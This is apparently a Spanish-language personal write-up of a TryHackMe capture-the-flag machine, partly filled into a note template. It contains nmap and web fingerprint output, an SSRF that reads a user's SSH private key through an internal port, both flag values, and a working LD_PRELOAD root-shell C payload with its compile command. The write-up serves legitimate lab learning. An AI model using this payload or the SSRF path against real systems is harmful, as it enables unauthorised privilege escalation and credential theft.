![[Pasted image 20260211173558.png]]
![[Pasted image 20260211193258.png]]
![[Pasted image 20260211193231.png]]
```
 Nmap 7.95 scan initiated Wed Feb 11 14:14:51 2026 as: /usr/lib/nmap/nmap --privileged -Pn -n -sV -sC -O -p22,80 -oN recon_10.64.148.52/03_enum_services.txt 10.64.148.52
Nmap scan report for 10.64.148.52
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:9f:23:0b:79:2e:d5:d2:50:07:6c:c7:91:35:bb:03 (RSA)
|   256 d0:80:26:af:8a:68:75:23:08:bb:0a:b2:cd:bd:cd:bb (ECDSA)
|_  256 77:f4:ab:62:7c:a2:48:d7:09:67:a6:7a:f2:10:06:1e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone|storage-misc
Running (JUST GUESSING): Linux 4.X|5.X|3.X (91%), Crestron 2-Series (86%), Google Android 10.X|11.X|12.X (85%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:3 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 4.15 (90%), Linux 5.4 (90%), Crestron XPanel control system (86%), Linux 3.8 - 3.16 (86%), Android 10 - 12 (Linux 4.14 - 4.19) (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




```

```

http://creative.thm/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@example.com,info@website.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.64.148.52], JQuery[3.4.1], Meta-Author[Devcrud], PasswordField, Script, Title[Creative Studio | Free Bootstrap 4.3.x template], YouTube, nginx[1.18.0]

```


# 🚩 [NOMBRE DE LA MÁQUINA/CTF]

## 📋 Info
- **Plataforma**: HTB / THM / VulnHub / Otra
- **Dificultad**: Easy / Medium / Hard / Insane
- **OS**: Linux / Windows
- **IP**: 
- **Fecha**: 

---

## 🔍 Nmap
```bash
Comando:
```

**Puertos abiertos**:
```
```

**Servicios interesantes**:
- 

---

## 🌐 Enumeración Web

### Fuzzing Directorios
```bash
Comando:
```

**Encontrado**:
- 

### Tecnologías
- **CMS/Framework**: 
- **Lenguaje**: 
- **Servidor**: 

### Endpoints interesantes
- 

---

## 🛠️ Herramientas Usadas
- 
- 
- 

---

## 👣 Foothold

### Vulnerabilidad
**Tipo**: 


**Descripción**:


**Exploit usado**:
```bash
```

### Shell inicial
**Usuario**: 
**Método**: 
```bash
Reverse shell:saad
```

---

##  Escalada de Privilegios

### Enumeración
```bash
Comandos:http://127.0.0.1:1337/home/saad/.ssh/id_rsa
```

**Hallazgos**:
- id_rsa de key usuario saad
![[Pasted image 20260211193122.png]]
### Vector de escalada
**Método**: SSRF
![[Pasted image 20260211193010.png]]

**Exploit**:
```bash
Panel vulnerable se podia utilizar para checkear puertos internos, en base a una enumeracion se consiguio entrar al puerto 1337 desde ese puerto podiamos obtener credenciales
```

---

## 🏁 Flags

**User Flag**:
```
user.txt: 9a1ce90a7653d74ab98630b47b8b4a84
```

**Root Flag**:
```
root.txt: 992bfd94b90da48634aed182aae7b99f
```

---

## 📝 Notas / Rabbit Holes



---

## 💡 Aprendizajes

 ```shell
 
 # Vulnerabilidad LD_PRELOAD

Configuración: env_keep += LD_PRELOAD

Descripción: La vulnerabilidad es que nos permite cargar en cualquier momento una librería que queramos. Es parecido a un path hijacking. Es viable si tenemos otro comando con privilegios sudo; en el caso de la máquina era ping.

Escenario de ejemplo: 'User saad may run the following commands on ip-10-64-167-240: (root) /usr/bin/ping'

Al ejecutar el comando junto con la variable, el sistema carga nuestra librería maliciosa antes que las originales, permitiendo ejecutar código como root debido a que el comando permitido (ping) corre con esos privilegios.
 
 ----Se creo un archivio llamado shell.c, despues se compilo y se ejecuto con-----
 
 #include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
 
 ```

---

## 🔗 Referencias


https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/